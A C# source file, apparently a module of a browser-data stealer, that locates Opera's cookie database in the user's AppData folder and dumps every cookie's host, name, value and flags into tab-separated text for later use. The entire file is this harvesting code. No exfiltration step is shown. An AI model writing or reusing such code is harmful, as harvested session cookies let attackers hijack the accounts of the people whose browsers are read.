using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Text;

namespace Stekie
{
    public static class Opera
    {
        public class cookies
        {
            private static List<Cookie> stcookies = null;
            private static string path = $@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\Opera Software\Opera Stable\Network\Cookies";
            public static string GetString()
            {
                if (stcookies == null)
                {
                    string dbPath = path;
                    stcookies = Cookies.Get(dbPath);
                }

                StringBuilder cookieString = new StringBuilder();
                foreach (Cookie cookie in stcookies)
                {
                    cookieString.AppendLine(cookie.ToString());
                }

                return cookieString.ToString();
            }
            public static List<Cookie> GetList()
            {
                if (stcookies == null)
                {
                    string dbPath = path;
                    stcookies = Cookies.Get(dbPath);
                }
                return stcookies;
            }

            public static bool GetBool()
            {
                if (stcookies == null)
                {
                    string dbPath = path;
                    stcookies = Cookies.Get(dbPath);
                }
                return (stcookies.Count == 0 ? false : true);
            }


        }




        public class Cookie
        {
            public string HostKey { get; set; }
            public string Name { get; set; }
            public string Value { get; set; }
            public string Path { get; set; }
            public long ExpiresUtc { get; set; }
            public bool IsSecure { get; set; }
            public bool IsHttpOnly { get; set; }

            public override string ToString()
            {
                return $"{HostKey}\t{Name}\t{Value}\t{Path}\t{ExpiresUtc}\t{IsSecure}\t{IsHttpOnly}";
            }
        }
        public static class Cookies
        {
            public static List<Cookie> Get(string dbPath)
            {
                List<Cookie> cookies = new List<Cookie>();
                try
                {
                    using (SQLiteConnection connection = new SQLiteConnection($"Data Source={dbPath};"))
                    {
                        connection.Open();
                        using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM cookies;", connection))
                        {
                            using (SQLiteDataReader reader = command.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    Cookie cookie = new Cookie();
                                    cookie.HostKey = reader["host_key"].ToString();
                                    cookie.Name = reader["name"].ToString();
                                    cookie.Value = reader["value"].ToString();
                                    cookie.Path = reader["path"].ToString();
                                    cookie.ExpiresUtc = Convert.ToInt64(reader["expires_utc"]);
                                    cookie.IsSecure = Convert.ToBoolean(reader["is_secure"]);
                                    cookie.IsHttpOnly = Convert.ToBoolean(reader["is_httponly"]);

                                    cookies.Add(cookie);
                                }
                            }

                            if (cookies.Count == 0)
                            {
                                return new List<Cookie>();
                            }
                        }
                    }
                }
                catch (Exception)
                {
                    return new List<Cookie>();
                }
                return cookies;

            }
        }
    }
}